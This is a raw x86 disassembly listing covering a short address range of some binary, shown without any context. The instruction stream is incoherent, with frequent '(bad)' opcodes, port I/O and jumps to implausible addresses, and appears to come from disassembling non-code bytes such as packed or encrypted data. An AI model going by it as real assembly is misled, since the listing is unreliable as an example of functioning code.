  40af7f:	adc    ch,dl
  40af81:	sahf   
  40af82:	cli    
  40af83:	ins    DWORD PTR es:[edi],dx
  40af84:	gs push edx
  40af86:	pop    ebx
  40af87:	in     eax,0x6d
  40af89:	pushf  
  40af8a:	pop    eax
  40af8b:	mov    esp,0xbe7b4db0
  40af90:	push   eax
  40af91:	jge    0x40afa0
  40af93:	sub    BYTE PTR [esi],dl
  40af95:	div    edx
  40af97:	out    dx,eax
  40af98:	mov    edi,0xac2d5b24
  40af9d:	cvttps2pi mm0,QWORD PTR [ecx]
  40afa0:	mov    DWORD PTR [ebx],esp
  40afa2:	ret    0x90d2
  40afa5:	nop
  40afa6:	push   edi
  40afa7:	inc    eax
  40afa8:	nop
  40afa9:	mov    ebx,0x3ac365d9
  40afae:	cmp    esp,esi
  40afb0:	cwde   
  40afb1:	out    0xa1,al
  40afb3:	imul   ebp,DWORD PTR ss:[ebp+eiz*4-0x4b5894f8],0x86dee575
  40afbf:	out    dx,al
  40afc0:	xlat   BYTE PTR ds:[ebx]
  40afc1:	fwait
  40afc2:	jmp    0x40af94
  40afc4:	scas   al,BYTE PTR es:[edi]
  40afc5:	shl    DWORD PTR [esi+0x437075c7],1
  40afcb:	(bad)  
  40afcc:	aas    
  40afcd:	fld    DWORD PTR [edx+edx*2-0x27]
  40afd1:	les    ecx,FWORD PTR [ecx+0x57991950]
  40afd7:	fst    QWORD PTR [eax]
  40afd9:	repnz test al,0x17
  40afdc:	lea    edi,[edi]
  40afde:	pop    esp
  40afdf:	mov    DWORD PTR [eax-0x6],ebp
  40afe2:	push   ebx
  40afe3:	cmp    esp,0xb852c15e
  40afe9:	cmp    al,0x4e
  40afeb:	sub    bh,BYTE PTR [edx]
  40afed:	mov    ecx,0x3c08f1b0
  40aff2:	adc    eax,0xf9edf5a9
  40aff7:	jmp    0xc6818da5
  40affc:	push   edi
  40affd:	jae    0x40afc4
  40afff:	into   
  40b000:	pop    ecx
  40b001:	mov    ebp,0x3689f055
  40b006:	pop    edx
  40b007:	mov    esp,0x3d558395
  40b00c:	xor    dl,BYTE PTR [esp+edi*1-0xca31d55]
  40b013:	pop    ds
  40b014:	sbb    DWORD PTR [ebp+0x23],ebx
  40b017:	stos   BYTE PTR es:[edi],al
  40b018:	sbb    eax,0xf3292ff2
  40b01d:	out    0xd5,eax
  40b01f:	rcr    BYTE PTR [esi+ebx*1],1
  40b022:	sbb    al,0x2
  40b024:	call   0x31741db7
  40b029:	mov    al,ds:0x6ecfcc2f
  40b02e:	jge    0x40afe4
  40b030:	enter  0x5ed6,0x91
  40b034:	out    dx,al
  40b035:	shl    DWORD PTR [ebp+0x45],1
  40b038:	sbb    eax,0x4c8485f2
  40b03d:	ror    BYTE PTR [eax-0x1db22566],1
  40b043:	inc    ebx
  40b044:	push   0xffffffbd
  40b046:	(bad)  
  40b048:	sub    ecx,edx
  40b04a:	inc    eax
  40b04b:	sbb    cl,BYTE PTR [edi]
  40b04d:	ins    BYTE PTR es:[edi],dx
  40b04e:	jno    0x40afe7
  40b050:	pop    esp
  40b051:	inc    edx
  40b052:	popf   
  40b053:	xchg   BYTE PTR [ecx+0x5e],bl
  40b056:	cmp    ecx,DWORD PTR [ebx+0x175e6785]
  40b05c:	je     0x40b09c
  40b05e:	mov    ds:0x9634143d,al
  40b063:	arpl   WORD PTR ds:0x2a217634,si
  40b069:	ds push ebp
  40b06b:	retf   0x1ac
  40b06e:	push   edi
  40b06f:	jne    0x40b0bd
  40b071:	es dec ebx
  40b073:	pop    ds
  40b074:	push   esi
  40b075:	pop    edx
  40b076:	inc    ecx
  40b077:	scas   al,BYTE PTR es:[edi]
  40b078:	cmc    
  40b079:	xchg   esi,eax
  40b07a:	clc    
  40b07b:	outs   dx,BYTE PTR ds:[esi]
  40b07c:	mov    ebp,0x2f418275
  40b081:	aad    0x5c
  40b083:	enter  0x1bef,0xeb
  40b087:	hlt    
  40b088:	pop    es
  40b089:	mov    BYTE PTR [edx+0x4af99b61],dl
  40b08f:	mov    cl,0xb7
  40b091:	fnstcw WORD PTR ds:0x90fcaa2d
  40b097:	call   0x61d79622
  40b09c:	out    dx,eax
  40b09d:	mov    bl,0xab
  40b09f:	fst    QWORD PTR [edx+ebx*8-0x3]
  40b0a3:	test   BYTE PTR [ecx],al
  40b0a5:	pop    edi
  40b0a6:	dec    eax
  40b0a7:	jo     0x40b073
  40b0a9:	mov    bl,BYTE PTR [ebp+0x17cf9c13]
  40b0af:	dec    esp
  40b0b0:	mov    WORD PTR [ebx],cs
  40b0b2:	jge    0x40b055
  40b0b4:	mov    ds:0xcc8e6515,al
  40b0b9:	(bad)  
  40b0ba:	(bad)  
  40b0bb:	call   0x1f7c:0xcadc30f5
  40b0c2:	and    BYTE PTR gs:[esi],dh
  40b0c5:	aaa    
  40b0c6:	cld    
  40b0c7:	adc    edx,edx
  40b0c9:	out    0xf0,al
  40b0cb:	push   ebx
  40b0cc:	in     eax,dx
  40b0cd:	xchg   ebx,eax
  40b0ce:	ss mov ds,ebp
  40b0d1:	cmp    DWORD PTR [ebx+ebp*2],eax
  40b0d4:	push   ebx
  40b0d5:	push   0xcbb8d173
  40b0da:	lahf   
  40b0db:	lock xor ebp,DWORD PTR [edi-0x45]
  40b0df:	mov    ebp,0x7b1b037c
  40b0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e5:	xor    cl,BYTE PTR [esi+edx*1+0x2d]
  40b0e9:	or     BYTE PTR [ebp+0x1bceaa1],cl
  40b0ef:	(bad)  
  40b0f0:	idiv   ah
  40b0f2:	mov    edx,0x9ff367b6
  40b0f7:	dec    ebp
  40b0f8:	lahf   
  40b0f9:	mov    ecx,0xb3206157
  40b0fe:	adc    BYTE PTR [ebx+0x365dd21d],dh
  40b104:	ficomp DWORD PTR [esi]
  40b106:	out    0x4a,al
  40b108:	sar    BYTE PTR [ecx+0x4d293c80],1
  40b10e:	lahf   
  40b10f:	dec    ebp
  40b110:	test   BYTE PTR [ebp+0x13],ah
  40b113:	inc    esp
  40b114:	xor    BYTE PTR [ecx+edx*8-0x422f86b1],dl
  40b11b:	jne    0x40b0d7
  40b11d:	dec    esp
  40b11e:	aaa    
  40b11f:	mov    ?,ecx
  40b121:	and    esp,DWORD PTR [esi+eiz*4-0x3baa7714]
  40b128:	rol    ebx,0x25
  40b12b:	sahf   
  40b12c:	xor    al,0xc8
  40b12e:	ror    BYTE PTR ds:0x29c0cd8b,cl
  40b134:	sahf   
  40b135:	push   ss
  40b136:	jecxz  0x40b0e8
  40b138:	sbb    esi,ecx
  40b13a:	iret   
  40b13b:	jo     0x40b1a2
  40b13d:	mov    dl,0x9e
  40b13f:	jmp    0x75c0:0xcfeb068a
  40b146:	repnz sahf 
  40b148:	add    al,0x88
  40b14a:	mov    eax,ds:0xb310cd7a
  40b14f:	pop    ebp
  40b150:	popf   
  40b151:	sub    BYTE PTR [ecx],dh
  40b153:	xlat   BYTE PTR ds:[ebx]
  40b154:	push   0x76
  40b156:	lock mov bh,0x27
  40b159:	fmul   DWORD PTR [esi+0x7beb616d]
  40b15f:	in     eax,dx
  40b160:	push   eax
  40b161:	scas   al,BYTE PTR es:[edi]
  40b162:	inc    ebx
  40b163:	std    
  40b164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b165:	inc    ebp
  40b166:	xchg   esi,eax
  40b167:	sbb    bh,BYTE PTR [ecx]
  40b169:	dec    ecx
  40b16a:	dec    ecx
  40b16b:	xchg   edx,eax
  40b16c:	inc    eax
  40b16d:	iret   
  40b16e:	adc    DWORD PTR [ebp+0x78ce917],esi
  40b174:	sub    BYTE PTR [eax-0x78],ah
  40b177:	pop    eax
  40b178:	jg     0x40b18f
  40b17a:	xor    ecx,ebx
  40b17c:	ja     0x40b1e7
  40b17e:	je     0x40b153
  40b180:	mov    edi,edi
  40b182:	push   esp
  40b183:	sub    eax,0xbee77a34
  40b188:	xor    BYTE PTR [eax],ah
  40b18a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b18b:	add    DWORD PTR [ebx+0x5f],esp
  40b18e:	js     0x40b17d
  40b190:	pop    es
  40b191:	neg    DWORD PTR [ecx]
  40b193:	dec    edx
  40b194:	call   0x980a496c
  40b199:	push   0x3ce72d4b
  40b19e:	push   ecx
  40b19f:	scas   al,BYTE PTR es:[edi]
  40b1a0:	inc    edx
  40b1a1:	or     ah,BYTE PTR [ebx-0x33b40eff]
  40b1a7:	stos   DWORD PTR es:[edi],eax
  40b1a8:	es stos BYTE PTR es:[edi],al
  40b1aa:	mov    al,dh
  40b1ac:	jle    0x40b1a2
  40b1ae:	ret    0xf36b
  40b1b1:	mov    esp,0x329b4ea7
  40b1b6:	jge    0x40b1b0
  40b1b8:	mov    bl,ch
  40b1ba:	adc    bh,BYTE PTR [eax]
  40b1bc:	inc    BYTE PTR [eax]
  40b1be:	sar    DWORD PTR [ebp+ebp*8+0x13],0xab
  40b1c3:	ret    0xc028
  40b1c6:	sbb    BYTE PTR [eax],0xa2
  40b1c9:	add    eax,0x619fdd00
  40b1ce:	mov    eax,0xd16258fa
  40b1d3:	stc    
  40b1d4:	sar    BYTE PTR [ebp-0x767f40f2],0xf6
  40b1db:	int    0xc9
  40b1dd:	aas    
  40b1de:	dec    edx
  40b1df:	fadd   QWORD PTR [edx-0x1a]
  40b1e2:	pop    eax
  40b1e3:	add    bh,BYTE PTR ds:0x4d7471d6
  40b1e9:	enter  0xdf0b,0xd1
  40b1ed:	sub    BYTE PTR [eax],ah
  40b1ef:	ja     0x40b240
  40b1f1:	fisttp WORD PTR gs:[edi]
  40b1f4:	fidivr WORD PTR [ebp-0xcfe20be]
  40b1fa:	mov    ah,0xb7
  40b1fc:	mov    dh,0x14
  40b1fe:	mov    DWORD PTR [eax],edi
  40b200:	mov    eax,0xcf33233d
  40b205:	push   ebp
  40b206:	xchg   esp,eax
  40b207:	sar    BYTE PTR [eax+ebx*4-0x185e7171],1
  40b20e:	sub    al,0xa
  40b210:	sbb    al,0x5
  40b212:	repz call 0xde829e5e
  40b218:	mov    bl,0x44
  40b21a:	sbb    eax,0x94bb90f4
  40b21f:	(bad)  
  40b220:	out    0x4c,eax
  40b222:	inc    ebp
  40b223:	dec    ebp
  40b224:	and    ch,BYTE PTR [edx]
  40b226:	push   eax
  40b227:	mov    eax,DWORD PTR [ecx+0x77]
  40b22a:	mov    ds:0x36d5885f,al
  40b22f:	out    dx,eax
  40b230:	rsqrtps xmm4,XMMWORD PTR [ebx-0xe]
  40b234:	mov    dh,0xb0
  40b236:	and    ebx,DWORD PTR ds:0x90f3d133
  40b23c:	and    al,al
  40b23e:	and    ebx,DWORD PTR [edi+eax*2+0x30bc7aa2]
  40b245:	pop    ss
  40b246:	and    al,0xd7
  40b248:	dec    edx
  40b249:	test   al,0xd2
  40b24b:	xlat   BYTE PTR ds:[ebx]
  40b24c:	jge    0x40b1fb
  40b24e:	retf   
  40b24f:	push   ds
  40b250:	test   ebp,ebx
  40b252:	(bad)  
  40b253:	sbb    BYTE PTR [ebp+0x16],bl
  40b256:	cmp    ebp,DWORD PTR [edx+0x2d764121]
  40b25c:	int3   
  40b25d:	loop   0x40b2dc
  40b25f:	stc    
  40b260:	mov    al,0xe8
  40b262:	jno    0x40b1ec
  40b264:	fisub  DWORD PTR [ecx]
  40b266:	push   esp
  40b267:	(bad)  
  40b268:	test   al,0xc9
  40b26a:	das    
  40b26b:	sar    DWORD PTR [ecx-0x1df74186],1
  40b271:	jl     0x40b261
  40b273:	es (bad) 
  40b275:	push   es
  40b276:	mov    cl,0x49
  40b278:	imul   esp,edi,0x32c5123c
  40b27e:	mov    cl,0xc9
  40b280:	pop    esp
  40b281:	jae    0x40b251
  40b283:	test   DWORD PTR [edx-0x20036606],eax
  40b289:	sbb    eax,0x3f6f2ada
  40b28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b28f:	add    al,0x61
  40b291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b292:	leave  
  40b293:	xchg   edx,eax
  40b294:	(bad)  
  40b295:	xchg   edx,eax
  40b296:	and    eax,0xb287dc1a
  40b29b:	sub    eax,0x40cb6eec
  40b2a0:	mov    DWORD PTR [ebx-0x7f0f3cb5],ebp
  40b2a6:	mov    ds:0xf86d2343,al
  40b2ab:	lods   eax,DWORD PTR ds:[esi]
  40b2ac:	adc    DWORD PTR [edx],edx
  40b2ae:	aad    0x6d
  40b2b0:	test   DWORD PTR [eax-0x102b4991],eax
  40b2b6:	in     eax,0x2b
  40b2b8:	pop    DWORD PTR [ecx-0x42]
  40b2bb:	test   al,0x1e
  40b2bd:	add    al,0x58
  40b2bf:	mov    ds:0x34fe958f,al
  40b2c4:	push   ebx
  40b2c5:	(bad)  
  40b2c6:	repz or BYTE PTR fs:[edi-0x2b9b47be],cl
  40b2ce:	inc    edi
  40b2cf:	inc    edi
  40b2d0:	aas    
  40b2d1:	lock xchg esi,eax
  40b2d3:	push   ds
  40b2d4:	dec    ebp
  40b2d5:	or     al,0x45
  40b2d7:	in     al,0x3
  40b2d9:	add    ah,BYTE PTR [ecx]
  40b2db:	pop    ebx
  40b2dc:	call   0x266:0xf51a5f58
  40b2e3:	jb     0x40b32c
  40b2e5:	jmp    0x9943bc9c
  40b2ea:	scas   al,BYTE PTR es:[edi]
  40b2eb:	lods   eax,DWORD PTR ds:[esi]
  40b2ec:	push   ebp
  40b2ed:	pop    esp
  40b2ee:	xor    DWORD PTR [eax+0x7d],esi
  40b2f1:	ins    BYTE PTR es:[edi],dx
  40b2f2:	sbb    BYTE PTR [esi+0x7ca62428],ah
  40b2f8:	xor    al,BYTE PTR [ebx]
  40b2fa:	dec    esi
  40b2fb:	mov    ebp,0x51cae824
  40b300:	xchg   ebx,eax
  40b301:	fbstp  TBYTE PTR [edi-0x6e]
  40b304:	inc    ecx
  40b305:	jecxz  0x40b295
  40b307:	cli    
  40b308:	out    dx,eax
  40b309:	sar    ebx,0xd5
  40b30c:	xlat   BYTE PTR ds:[ebx]
  40b30d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b30e:	daa    
  40b30f:	push   0xe0e03be7
  40b314:	mov    DWORD PTR [eax+0x45],ebx
  40b317:	jne    0x40b29c
  40b319:	popf   
  40b31a:	mov    ds:0x62457b4b,al
  40b31f:	imul   DWORD PTR [ecx]
  40b321:	jne    0x40b349
  40b323:	imul   edx,ebp,0xffffffe0
  40b326:	hlt    
  40b327:	pop    es
  40b328:	in     eax,0x42
  40b32a:	stc    
  40b32b:	inc    ebx
  40b32c:	iret   
  40b32d:	inc    esp
  40b32e:	xchg   DWORD PTR [eax],ecx
  40b330:	cmovnp esi,DWORD PTR [edi+ecx*8]
  40b334:	jmp    0xef7bc97d
  40b339:	das    
  40b33a:	(bad)  
  40b33b:	mov    al,0xe
  40b33d:	xchg   ecx,esi
  40b33f:	or     BYTE PTR [eax+0x60],bl
  40b342:	dec    esi
  40b343:	outs   dx,DWORD PTR ds:[esi]
  40b344:	popa   
  40b345:	(bad)  
  40b346:	idiv   BYTE PTR [edx+0x62f3e36d]
  40b34c:	push   eax
  40b34d:	dec    edi
  40b34e:	mov    ch,0x20
  40b350:	test   eax,0xab6fd5a2
  40b355:	pop    es
  40b356:	mov    ah,0xdc
  40b358:	or     eax,0x5156aa9d
  40b35d:	add    edx,edi
  40b35f:	jge    0x40b364
  40b361:	mov    esi,DWORD PTR [edi+ecx*1+0x26]
  40b365:	gs jmp 0x3178d6d8
  40b36b:	mov    ah,0xe7
  40b36d:	add    DWORD PTR [edx+edx*1-0x71],0x41
  40b372:	shr    DWORD PTR [edx],1
  40b374:	pop    esi
  40b375:	bound  ebp,QWORD PTR [esi]
  40b377:	mov    esp,0x129c543e
  40b37c:	adc    DWORD PTR [ecx-0x60e8d845],esi
  40b382:	dec    ebp
  40b383:	lea    ebx,[ebx-0xf3f2cfd]
  40b389:	popf   
  40b38a:	sub    al,0x38
  40b38c:	xor    BYTE PTR [ecx+0x53972672],bh
  40b392:	jb     0x40b3d4
  40b394:	dec    esp
  40b395:	jle    0x40b3c9
  40b397:	sbb    BYTE PTR [ecx+0x3f],0x1d
  40b39b:	mov    esi,0xc91853a8
  40b3a0:	arpl   WORD PTR [edx-0x5d2e516],bx
  40b3a6:	cs retf 0x8c83
  40b3aa:	jae    0x40b3ed
  40b3ac:	jno    0x40b394
  40b3ae:	in     al,dx
  40b3af:	mov    DWORD PTR cs:[ebp-0x61],ecx
  40b3b3:	sti    
  40b3b4:	fnsave [esi+eiz*4]
  40b3b7:	je     0x40b360
  40b3b9:	clc    
  40b3ba:	jo     0x40b3ae
  40b3bc:	jns    0x40b3c0
  40b3be:	dec    esp
  40b3bf:	fdiv   QWORD PTR [edx+eax*2]
  40b3c2:	or     ah,BYTE PTR [ebx]
  40b3c4:	out    0xe,eax
  40b3c6:	dec    eax
  40b3c7:	push   cs
  40b3c8:	pop    ss
  40b3c9:	pop    ecx
  40b3ca:	nop
  40b3cb:	dec    edx
  40b3cc:	test   DWORD PTR ds:0x80b0ecc8,ebx
  40b3d2:	inc    ebx
  40b3d3:	pop    ebx
  40b3d4:	xchg   ecx,eax
  40b3d5:	test   BYTE PTR [eax-0x28],ah
  40b3d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3d9:	das    
  40b3da:	jg     0x40b383
  40b3dc:	lea    ebx,[edi+0x7736874b]
  40b3e2:	inc    edx
  40b3e3:	in     al,0x22
  40b3e5:	xlat   BYTE PTR ds:[ebx]
  40b3e6:	and    edi,DWORD PTR [ecx+ecx*1+0x65f60cdc]
  40b3ed:	mov    edx,0xccf7fd98
  40b3f2:	dec    ecx
  40b3f3:	not    BYTE PTR [edx]
  40b3f5:	or     al,0xa
  40b3f7:	es dec cl
  40b3fa:	and    al,0x65
  40b3fc:	or     al,0x37
  40b3fe:	scas   eax,DWORD PTR es:[edi]
  40b3ff:	shr    BYTE PTR [edx+0x2cb4af1c],cl
  40b405:	nop
  40b406:	sub    al,dl
  40b408:	rcr    BYTE PTR [edx+ebp*4-0x26],1
  40b40c:	out    0xf6,eax
  40b40e:	mov    ah,0x30
  40b410:	in     al,dx
  40b411:	adc    eax,0xa3d3dad4
  40b416:	nop
  40b417:	jmp    0xe92a:0xb2928c0d
  40b41e:	push   ebp
  40b41f:	mov    ebp,0xfec7d171
  40b424:	mov    bl,0xc0
  40b426:	js     0x40b471
  40b428:	xchg   esp,eax
  40b429:	div    al
  40b42b:	sti    
  40b42c:	int    0x67
  40b42e:	(bad)  
  40b42f:	das    
  40b430:	mov    ah,0x89
  40b432:	xchg   edi,eax
  40b433:	jno    0x40b494
  40b435:	ret    0x570a
  40b438:	pop    esp
  40b439:	(bad)  
  40b43a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b43b:	lods   al,BYTE PTR ds:[esi]
  40b43c:	jp     0x40b494
  40b43e:	jp     0x40b47f
  40b440:	push   0xffffffc1
  40b442:	rcl    DWORD PTR [edi-0x7ca78382],cl
  40b448:	mov    ch,0x4d
  40b44a:	popa   
  40b44b:	jle    0x40b49e
  40b44d:	cmp    ch,BYTE PTR [esi]
  40b44f:	sub    cl,bl
  40b451:	xor    al,0x7b
  40b453:	arpl   sp,sp
  40b455:	mov    edx,0x6acf35b0
  40b45a:	xchg   eax,esi
  40b45c:	xchg   BYTE PTR [ebp+0x543fecea],ch
  40b462:	cmp    eax,0x60c51871
  40b467:	jle    0x40b4cd
  40b469:	ror    DWORD PTR [edx+0x329836b5],1
  40b46f:	cmp    BYTE PTR [ebp-0x73],0x84
  40b473:	inc    ebx
  40b474:	imul   edx,DWORD PTR [esi+0x4b],0xa9efb159
  40b47b:	xchg   edi,eax
  40b47c:	pop    eax
  40b47d:	ret    0xfb4
  40b480:	adc    esp,0x48da1bdb
  40b486:	dec    esi
  40b487:	retf   0xb899
  40b48a:	sbb    BYTE PTR [esi-0x1b858510],ch
  40b490:	stc    
  40b491:	mov    edi,0xbb32f982
  40b496:	and    ecx,DWORD PTR [esi]
  40b498:	shl    DWORD PTR [edx+0x6fed2325],1
  40b49e:	adc    esp,ebx
  40b4a0:	mov    eax,0x9e730854
  40b4a5:	lock es out 0xa6,eax
  40b4a9:	hlt    
  40b4aa:	in     eax,dx
  40b4ab:	pop    ss
  40b4ac:	shl    BYTE PTR [ecx+0x48],cl
  40b4af:	xor    al,0x7e
  40b4b1:	ins    DWORD PTR es:[edi],dx
  40b4b2:	retf   
  40b4b3:	inc    esp
  40b4b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4b5:	mov    ds:0x4859888d,al
  40b4ba:	mov    ds:0x427ac1ce,al
  40b4bf:	and    ebp,DWORD PTR [eax]
  40b4c1:	push   0xffffffee
  40b4c3:	jle    0x40b516
  40b4c5:	les    esi,FWORD PTR [esi]
  40b4c7:	je     0x40b46c
  40b4c9:	pop    ebx
  40b4ca:	out    dx,al
  40b4cb:	push   eax
  40b4cc:	mov    dl,0x5
  40b4ce:	sbb    DWORD PTR [eax-0x20],ebx
  40b4d1:	int    0x7f
  40b4d3:	out    dx,eax
  40b4d4:	sbb    BYTE PTR [edx-0x4c969b47],cl
  40b4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4db:	pop    ebp
  40b4dc:	lds    esp,FWORD PTR [edi+ecx*2]
  40b4df:	fisttp QWORD PTR [ebx+0x5daad166]
  40b4e5:	and    al,0x5e
  40b4e7:	push   edi
  40b4e8:	lods   eax,DWORD PTR ds:[esi]
  40b4e9:	mov    ecx,0x5f353dd5
  40b4ee:	xchg   ebp,eax
  40b4ef:	nop
  40b4f0:	inc    esp
  40b4f1:	aaa    
  40b4f2:	cld    
  40b4f3:	push   ebx
  40b4f4:	imul   ecx,edi,0xffffff87
  40b4f7:	gs mov cl,0x8b
  40b4fa:	cmp    edx,edx
  40b4fc:	push   edi
  40b4fd:	inc    eax
  40b4fe:	pop    eax
  40b4ff:	mov    edi,0x13f7d0db
  40b504:	popf   
  40b505:	shl    DWORD PTR [edx+0x3ddb81a7],cl
  40b50b:	outs   dx,BYTE PTR ds:[esi]
  40b50c:	aas    
  40b50d:	push   esi
  40b50e:	(bad)  
  40b50f:	fst    st(2)
  40b511:	cmp    eax,0xfdd9637a
  40b516:	les    esi,FWORD PTR ds:0x39b420b7
  40b51c:	std    
  40b51d:	iret   
  40b51e:	adc    edx,edx
  40b520:	int    0x66
  40b522:	cwde   
  40b523:	lock lods eax,DWORD PTR ds:[esi]
  40b525:	xor    BYTE PTR ds:0x731e5a7,ah
  40b52b:	mov    esi,0x811c7428
  40b530:	pop    ds
  40b531:	cwde   
  40b532:	sbb    dh,ah
  40b534:	fcomip st,st(3)
  40b536:	push   esi
  40b537:	inc    ecx
  40b538:	out    dx,eax
  40b539:	xchg   DWORD PTR [ecx+0x6b],ecx
  40b53c:	imul   edx,DWORD PTR [ecx+0x61],0xd30e8539
  40b543:	js     0x40b4e9
  40b545:	mov    BYTE PTR [eax-0x30c20706],0x93
  40b54c:	inc    esp
  40b54d:	mov    ebx,0xa00b66e
  40b552:	jo     0x40b509
  40b554:	cmp    ecx,esi
  40b556:	add    BYTE PTR [ecx-0x7b],0x5a
  40b55a:	or     edx,DWORD PTR [edi-0x50]
  40b55d:	push   0xa47a6336
  40b562:	jbe    0x40b5d4
  40b564:	inc    edx
  40b565:	ror    cl,1
  40b567:	fadd   DWORD PTR ss:[esi]
  40b56a:	lock add edx,DWORD PTR [eax]
  40b56d:	dec    eax
  40b56e:	xor    eax,0xac5f7bf
  40b573:	jmp    0xdfe4:0xa7a28fad
  40b57a:	fsub   QWORD PTR [ebx-0xe]
  40b57d:	jecxz  0x40b5d1
  40b57f:	cmp    BYTE PTR [ecx+edi*1+0x55],ah
  40b583:	push   0xf834eca8
  40b588:	push   esi
  40b589:	pop    ebp
  40b58a:	sub    al,0xd0
  40b58c:	fldcw  WORD PTR [ebx+0x65]
  40b58f:	addr16 (bad) 
  40b591:	leave  
  40b592:	mov    bl,0x2d
  40b594:	das    
  40b595:	lods   al,BYTE PTR ds:[esi]
  40b596:	dec    eax
  40b597:	push   ecx
  40b598:	xchg   ebp,eax
  40b599:	iret   
  40b59a:	mov    eax,0x82a69cb2
  40b59f:	inc    edx
  40b5a0:	cmp    DWORD PTR [edi],0xd66ea859
  40b5a6:	adc    dh,dh
  40b5a8:	sub    DWORD PTR [edi-0x68],esi
  40b5ab:	ins    BYTE PTR es:[edi],dx
  40b5ac:	pop    edi
  40b5ad:	int3   
  40b5ae:	pushf  
  40b5af:	push   ebx
  40b5b0:	fadd   QWORD PTR [edi*1+0x22a7139e]
  40b5b8:	inc    edx
  40b5b9:	aaa    
  40b5ba:	xor    BYTE PTR [ebx-0x42dcbb62],al
  40b5c0:	mov    bl,0xe2
  40b5c2:	fbstp  TBYTE PTR [ebx]
  40b5c4:	lods   eax,DWORD PTR ds:[esi]
  40b5c5:	aam    0xbe
  40b5c7:	jae    0x40b60a
  40b5c9:	pop    ss
  40b5ca:	xor    DWORD PTR [esi],ebp
  40b5cc:	dec    eax
  40b5cd:	(bad)  
  40b5ce:	or     DWORD PTR [esi-0x4c],esi
  40b5d1:	and    eax,0x6976ef94
  40b5d6:	data16 xchg bl,ah
  40b5d9:	push   ss
  40b5da:	pop    ebx
  40b5db:	jle    0x40b5b6
  40b5dd:	sahf   
  40b5de:	mov    ch,0x1a
  40b5e0:	retf   
  40b5e1:	hlt    
  40b5e2:	add    BYTE PTR ss:[ebp-0x11],ah
  40b5e6:	or     eax,ebp
  40b5e8:	pop    ebp
  40b5e9:	mov    eax,DWORD PTR [eax]
  40b5eb:	mov    esp,0xa3f828a7
  40b5f0:	popa   
  40b5f1:	shl    DWORD PTR [edi+0x6d],1
  40b5f4:	add    ebp,DWORD PTR [ebp-0x1b]
  40b5f7:	jle    0x40b633
  40b5f9:	or     DWORD PTR [edx+0x38],esi
  40b5fc:	mov    edx,0xca58eb71
  40b601:	loop   0x40b5f8
  40b603:	xor    bh,BYTE PTR [esi+0xf]
  40b606:	aad    0xa5
  40b608:	in     eax,dx
  40b609:	pop    esi
  40b60a:	sub    eax,0x1ef5ffc2
  40b60f:	mov    al,ds:0xfa5ab48d
  40b614:	sub    al,BYTE PTR [eax+edi*1]
  40b617:	(bad)  
  40b619:	das    
  40b61a:	(bad)  
  40b61b:	jl     0x40b5be
  40b61d:	in     eax,dx
  40b61e:	gs cmc 
  40b620:	scas   eax,DWORD PTR es:[edi]
  40b621:	ja     0x40b648
  40b623:	test   al,0x6f
  40b625:	add    DWORD PTR [ecx-0x21],0x2e
  40b629:	jne    0x40b627
  40b62b:	in     eax,0x1c
  40b62d:	sahf   
  40b62e:	cwde   
  40b62f:	xor    esi,DWORD PTR [edi+0x779f4216]
  40b635:	push   edi
  40b636:	dec    esp
  40b637:	adc    eax,0x796a9c45
  40b63c:	loope  0x40b655
  40b63e:	or     edi,DWORD PTR [ecx]
  40b640:	cmp    al,0xbb
  40b642:	pop    ebx
  40b643:	and    dl,bl
  40b645:	sbb    eax,0xe4c45f4d
  40b64a:	sti    
  40b64b:	js     0x40b6bf
  40b64d:	jo     0x40b5d9
  40b64f:	ja     0x40b62e
  40b651:	pop    ebx
  40b652:	dec    ecx
  40b653:	imul   ebx,DWORD PTR [edi+0x66],0xff0af63e
  40b65a:	inc    ebp
  40b65b:	push   ds
  40b65c:	ja     0x40b6a7
  40b65e:	ror    DWORD PTR [edx-0xc19c2e],0x31
  40b665:	mov    ebx,0xccb1c6b3
  40b66a:	out    0x8b,al
  40b66c:	or     al,0x98
  40b66e:	(bad)  
  40b66f:	stos   BYTE PTR es:[edi],al
  40b670:	mov    ch,0x6a
  40b672:	pop    edx
  40b673:	aam    0x71
  40b675:	and    al,0x79
  40b677:	inc    eax
  40b678:	shl    BYTE PTR [edx+0x5c8ab820],cl
  40b67e:	ins    BYTE PTR es:[edi],dx
  40b67f:	dec    esi
  40b680:	mov    ebp,0xee901233
  40b685:	sar    DWORD PTR [eax],0xe1
  40b688:	add    eax,0x16373b0a
  40b68d:	psrld  mm4,QWORD PTR [ebx-0x31]
  40b691:	jns    0x40b6e7
  40b693:	push   esp
  40b694:	mov    al,0xd2
  40b696:	and    BYTE PTR [esi-0x2f],dl
  40b699:	cmc    
  40b69a:	pop    ss
  40b69b:	div    BYTE PTR [ebp-0x9bc8e1d]
  40b6a1:	mov    es:0x9a6f60e9,eax
  40b6a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a8:	xor    DWORD PTR [ebx-0x4bd4ac61],eax
  40b6ae:	ins    DWORD PTR es:[edi],dx
  40b6af:	test   eax,0x62495284
  40b6b4:	sbb    BYTE PTR [ebp+0x69],0x8
  40b6b8:	push   eax
  40b6b9:	pop    esp
  40b6ba:	adc    dl,BYTE PTR [eax+0x56]
  40b6bd:	push   ebp
  40b6be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6bf:	push   ecx
  40b6c0:	sub    BYTE PTR [ecx+0x2777bd15],ah
  40b6c6:	mov    edi,0x61790def
  40b6cb:	shl    BYTE PTR [ebp+0x27bc73d6],1
  40b6d1:	jg     0x40b6ce
  40b6d3:	add    eax,0x7423495c
  40b6d8:	xchg   BYTE PTR [edi-0x4f],ah
  40b6db:	add    al,0xd4
  40b6dd:	in     al,dx
  40b6de:	icebp  
  40b6df:	xlat   BYTE PTR ds:[ebx]
  40b6e0:	sbb    BYTE PTR ds:0x3fe4d882,ah
  40b6e6:	dec    edx
  40b6e7:	cmp    bl,BYTE PTR [eax]
  40b6e9:	stos   DWORD PTR es:[edi],eax
  40b6ea:	jl     0x40b768
  40b6ec:	(bad)  
